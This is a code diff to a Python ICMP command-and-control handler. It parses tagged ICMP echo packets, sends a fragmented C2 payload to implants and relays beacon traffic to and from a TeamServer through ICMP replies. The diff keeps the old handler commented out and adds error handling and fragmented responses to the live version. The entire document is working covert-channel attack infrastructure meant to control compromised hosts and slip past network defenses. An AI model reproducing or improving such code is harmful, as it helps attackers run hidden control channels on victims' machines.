@@ -68,53 +68,117 @@ class ICMP_C2_Handler:
         self.sock.sendall(struct.pack('<I', size))
         self.sock.sendall(data)
 
+    # def handle_icmp(self, packet):
+    #     try:
+    #         if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
+    #             return
+
+    #         raw_load = packet[Raw].load
+    #         if not raw_load.startswith(ICMP_TAG.encode()):
+    #             return
+
+    #         ip_src   = packet[IP].src
+    #         ip_dst   = packet[IP].dst
+    #         icmp_id  = getattr(packet[ICMP], "id", 1) & 0xFFFF
+    #         icmp_seq = getattr(packet[ICMP], "seq", 1) & 0xFFFF
+
+    #         payload_after_tag = raw_load[len(ICMP_TAG):]
+
+    #         # init packet check for sending payload
+    #         if icmp_seq == 0:
+    #             # Client’s size request; immediately reply with fragmented C2 payload
+    #             total_size = int.from_bytes(payload_after_tag[:4], "big")
+    #             print(f"[+] Client requested payload of {total_size} bytes")
+    #             # send payload back to client
+    #             self.send_fragmented_icmp(
+    #                 client_ip=ip_src,
+    #                 client_icmp_id=icmp_id,
+    #                 full_payload=self.payload
+    #             )
+    #             return
+
+    #         # if icmp_seq not 0, then send data to teamserver
+    #         # seq > 0: forward to TeamServer as before…
+    #         print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
+    #         # NEED TO STRIP the \x00 here, otherwise team server breaks (encryption things & length)
+    #         #print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
+    #         self.send_frame(payload_after_tag.rstrip(b"\x00"))
+    #         teamserver_response = self.recv_frame()
+
+    #         data_from_teamserver = ICMP_TAG.encode() + teamserver_response
+    #         print(f"TeamServer Says: {data_from_teamserver}")
+    #         print("[+] Sending simple ICMP‐reply with TeamServer’s response…")
+    #         reply = (
+    #             IP(dst=ip_src, src=ip_dst) /
+    #             ICMP(type=0, id=icmp_id, seq=icmp_seq) /
+    #             Raw(load=data_from_teamserver)
+    #         )
+    #         send(reply, verbose=False)
+    #         print(f"[+] Replied to {ip_src} with TeamServer’s data")
+    #     except Exception as e:
+
+    #         print(f"Error with handling ICMP: {e}")
+    #         # beacon will crash/comms layer will fail as it's stuck waiting on a message then.
+
+    #         # doesn't work
+    #         # reply = (
+    #         #     IP(dst=ip_src, src=ip_dst) /
+    #         #     ICMP(type=0, id=icmp_id, seq=icmp_seq) /
+    #         #     Raw(load=b"RQ47") # send nothing to maintian?
+    #         # )
+    #         # send(reply, verbose=False)
+
     def handle_icmp(self, packet):
-        if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
-            return
+        try:
+            if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
+                return
 
-        raw_load = packet[Raw].load
-        if not raw_load.startswith(ICMP_TAG.encode()):
-            return
+            raw_load = packet[Raw].load
+            if not raw_load.startswith(ICMP_TAG.encode()):
+                return
 
-        ip_src   = packet[IP].src
-        ip_dst   = packet[IP].dst
-        icmp_id  = getattr(packet[ICMP], "id", 1) & 0xFFFF
-        icmp_seq = getattr(packet[ICMP], "seq", 1) & 0xFFFF
+            ip_src   = packet[IP].src
+            ip_dst   = packet[IP].dst
+            icmp_id  = getattr(packet[ICMP], "id", 1) & 0xFFFF
+            icmp_seq = getattr(packet[ICMP], "seq", 1) & 0xFFFF
 
-        payload_after_tag = raw_load[len(ICMP_TAG):]
+            # strip off the 4-byte tag and (for seq=0) the length-field
+            payload_after_tag = raw_load[len(ICMP_TAG):]
 
-        # init packet check for sending payload
-        if icmp_seq == 0:
-            # Client’s size request; immediately reply with fragmented C2 payload
-            total_size = int.from_bytes(payload_after_tag[:4], "big")
-            print(f"[+] Client requested payload of {total_size} bytes")
-            # send payload back to client
+            if icmp_seq == 0:
+                # ─── Client asked “How big is your payload?” ───
+                total_size = int.from_bytes(payload_after_tag[:4], "big")
+                print(f"[+] Client requested payload of {total_size} bytes")
+
+                # Send the entire C2 payload in fragments (seq=0→length, then seq=1..N chunks)
+                self.send_fragmented_icmp(
+                    client_ip=ip_src,
+                    client_icmp_id=icmp_id,
+                    full_payload=self.payload
+                )
+                return
+
+            # ─── Now icmp_seq > 0: that means “client has sent us a data‐frame.”
+            print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
+
+            # strip trailing nulls (0x00) so TeamServer doesn’t choke on padding
+            to_server = payload_after_tag.rstrip(b"\x00")
+            self.send_frame(to_server)
+            teamserver_response = self.recv_frame()
+
+            # ─── Instead of building one giant reply, re‐use send_fragmented_icmp:
+            # full_payload should be just the raw bytes we got from TeamServer.
+            # send_fragmented_icmp will prepend your TAG/length and then chunk it.
+            print(f"[+] TeamServer returned {len(teamserver_response)} bytes → fragmenting…")
             self.send_fragmented_icmp(
                 client_ip=ip_src,
                 client_icmp_id=icmp_id,
-                full_payload=self.payload
+                full_payload=teamserver_response
             )
-            return
+            print(f"[+] Finished sending {len(teamserver_response)} bytes of TeamServer data back to {ip_src}")
 
-        # if icmp_seq not 0, then send data to teamserver
-        # seq > 0: forward to TeamServer as before…
-        print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
-        # NEED TO STRIP the \x00 here, otherwise team server breaks (encryption things & length)
-        #print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
-        self.send_frame(payload_after_tag.rstrip(b"\x00"))
-        teamserver_response = self.recv_frame()
-
-        data_from_teamserver = ICMP_TAG.encode() + teamserver_response
-        print(f"TeamServer Says: {data_from_teamserver}")
-        print("[+] Sending simple ICMP‐reply with TeamServer’s response…")
-        reply = (
-            IP(dst=ip_src, src=ip_dst) /
-            ICMP(type=0, id=icmp_id, seq=icmp_seq) /
-            Raw(load=data_from_teamserver)
-        )
-        send(reply, verbose=False)
-        print(f"[+] Replied to {ip_src} with TeamServer’s data")
-
+        except Exception as e:
+            print(f"Error with handling ICMP: {e}")
 
     # for large frames/payloads
     def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
